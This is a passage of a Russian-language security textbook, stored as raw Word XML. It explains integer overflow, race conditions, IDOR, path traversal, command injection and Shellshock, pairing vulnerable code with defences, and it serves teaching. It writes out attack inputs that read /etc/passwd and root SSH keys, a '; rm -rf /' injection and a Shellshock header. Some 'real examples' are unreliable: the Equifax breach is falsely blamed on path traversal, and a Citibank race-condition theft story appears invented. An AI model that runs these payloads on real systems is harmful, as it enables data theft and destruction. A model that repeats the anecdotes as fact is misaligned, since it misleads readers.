        <w:t>Уязвимый код выделения памяти</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>unsigned int size = atoi(user_input);  // Пользователь вводит размер</w:t>
        <w:br/>
        <w:t>char *buffer = malloc(size + 1);  // Выделяем size+1 байт</w:t>
        <w:br/>
        <w:t>read(fd, buffer, size);  // Читаем size байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер вводит `size = 0xFFFFFFFF` (4,294,967,295)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`size + 1` → **переполнение** → `0` (по модулю 2³²)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`malloc(0)` вернёт **маленький буфер** (или NULL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`read(fd, buffer, 0xFFFFFFFF)` → **переполнение буфера** → RCE</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — iPhone jailbreak (2007)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Integer overflow в обработчике TIFF-изображений Safari:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TIFF-файл содержал поля `width = 0xFFFFFFFF`, `height = 2`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вычисление размера: `width * height` → переполнение → маленький размер</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выделяется маленький буфер, но записывается больше данных → buffer overflow → jailbreak</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Проверка границ** перед арифметикой:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  if (size &gt; MAX_SIZE - 1) abort();  // Проверка переполнения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SafeInt** (библиотека для безопасной арифметики)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Флаг GCC: `-ftrapv` (прерывание при переполнении signed int)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.6.2. Эксплуатация логики приложений: Когда баги становятся багами в безопасности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Race Condition (Состояние гонки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ошибка, когда поведение программы зависит от </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>порядка выполнения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> операций (например, два потока изменяют одну переменную).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TOCTOU (Time-Of-Check-Time-Of-Use)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — классический вид race condition:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уязвимый код</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (проверка баланса перед переводом):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Поток 1: Перевод 100₽ другу</w:t>
        <w:br/>
        <w:t>balance = get_balance(user_id)  # ← Проверка (Time-Of-Check)</w:t>
        <w:br/>
        <w:t>if balance &gt;= 100:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    time.sleep(0.1)  # ← Окно уязвимости!</w:t>
        <w:br/>
        <w:t xml:space="preserve">    withdraw(user_id, 100)  # ← Использование (Time-Of-Use)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>У тебя на счету **100₽**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ты одновременно запускаешь **два запроса** на перевод 100₽</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оба потока проверяют баланс → **оба видят 100₽**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оба потока снимают 100₽ → итого **-200₽** (баланс уходит в минус)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Citibank (2016)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Клиент обнаружил race condition в банковском приложении:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Открыл 2 вкладки браузера</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Одновременно нажал "Перевести все деньги" в обеих вкладках</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Банк отправил **двойную сумму** (списал с его счёта 1000₽, но перевёл 2000₽)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украл **$2 млн** до того, как банк заметил</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транзакции БД** с уровнем изоляции `SERIALIZABLE`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Блокировки** (locks):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  with lock:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      balance = get_balance(user_id)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      if balance &gt;= 100:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">          withdraw(user_id, 100)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Atomic операции** (операции, которые нельзя прервать):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```sql</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  UPDATE accounts SET balance = balance - 100 WHERE user_id = 123 AND balance &gt;= 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>IDOR (Insecure Direct Object Reference)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Доступ к чужим данным через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>изменение ID</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в URL/API.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример уязвимого API</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>GET /api/user/profile?id=123</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Если сервер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не проверяет</w:t>
      </w:r>
      <w:r>
        <w:t>, что пользователь имеет право читать профиль `id=123`, хакер может перебрать ID:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>GET /api/user/profile?id=124  → Профиль другого пользователя</w:t>
        <w:br/>
        <w:t>GET /api/user/profile?id=125  → Ещё одного</w:t>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Parler (2021)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>После блокировки Parler (соцсети) в январе 2021, исследователи обнаружили IDOR:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>URL постов: `https://parler.com/post/{post_id}`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Не было проверки авторизации** → можно читать любой пост</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Исследователи скачали **70+ терабайт данных** (все посты, видео, метаданные, GPS-координаты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Это помогло ФБР идентифицировать участников штурма Капитолия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Авторизация на каждом запросе**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  @app.route('/api/user/profile/&lt;int:user_id&gt;')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  def get_profile(user_id):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      if current_user.id != user_id and not current_user.is_admin:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">          abort(403)  # Forbidden</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      return User.query.get(user_id)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UUID вместо последовательных ID**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  /api/user/profile/550e8400-e29b-41d4-a716-446655440000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  (перебрать UUID невозможно — 2¹²⁸ вариантов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Path Traversal (Обход путей)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Доступ к файлам </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>за пределами разрешённой директории</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> через `../` (переход на уровень выше).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уязвимый код</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>@app.route('/download')</w:t>
        <w:br/>
        <w:t>def download_file():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    filename = request.args.get('file')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return send_file(f"/var/www/uploads/{filename}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>GET /download?file=report.pdf  → OK (читает /var/www/uploads/report.pdf)</w:t>
        <w:br/>
        <w:t>GET /download?file=../../etc/passwd  → Читает /etc/passwd!</w:t>
        <w:br/>
        <w:t>GET /download?file=../../../../root/.ssh/id_rsa  → Украл SSH-ключ root!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Equifax (2017)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Path Traversal в веб-приложении позволял:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Читать файлы за пределами веб-директории</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украдены **147 млн записей** (SSN, даты рождения, адреса)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Штраф: **$700 млн**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Whitelist разрешённых файлов**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  allowed_files = ['report.pdf', 'invoice.pdf']</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  if filename not in allowed_files:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      abort(403)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Запрет `..` в имени файла**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  if '..' in filename or filename.startswith('/'):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      abort(400)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Canonicalization** (преобразование в абсолютный путь):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  import os</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  base_dir = "/var/www/uploads/"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  full_path = os.path.realpath(os.path.join(base_dir, filename))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  if not full_path.startswith(base_dir):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      abort(403)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Command Injection (Инъекция команд)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Выполнение </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>shell-команд</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> через пользовательский ввод.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уязвимый код</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>import os</w:t>
        <w:br/>
        <w:t>ip = input("Введите IP для ping: ")</w:t>
        <w:br/>
        <w:t>os.system(f"ping -c 4 {ip}")  # ОПАСНО!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите IP: 8.8.8.8; cat /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Выполнятся </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>две команды</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ping -c 4 8.8.8.8</w:t>
        <w:br/>
        <w:t>cat /etc/passwd  # Вывод всех пользователей системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ещё хуже</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите IP: 8.8.8.8; rm -rf /</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>(Удаление всех файлов на сервере. Шутка для сисадминов: rm -rf / --no-preserve-root)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — CVE-2014-6271 (Shellshock)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Уязвимость в Bash (см. раздел 9.6.6):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Веб-сервер передавал User-Agent в переменную окружения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bash выполнял код из переменной окружения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер отправлял:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Результат: выполнение произвольных команд на сервере</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**НЕ используй `os.system()`** с пользовательским вводом!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используй **безопасные API**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  import subprocess</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  result = subprocess.run(['ping', '-c', '4', ip], capture_output=True, text=True)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  (Здесь `ip` передаётся как </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>аргумент</w:t>
      </w:r>
      <w:r>
        <w:t>, а не как часть строки команды)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Whitelist** разрешённых символов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  import re</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  if not re.match(r'^[0-9.]+$', ip):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">      abort(400)  # Разрешены только цифры и точки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>XXE (XML External Entity)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Атака на XML-парсер, который обрабатывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>внешние сущности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (external entities).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это работает?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">XML позволяет определить </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сущности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (entities):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
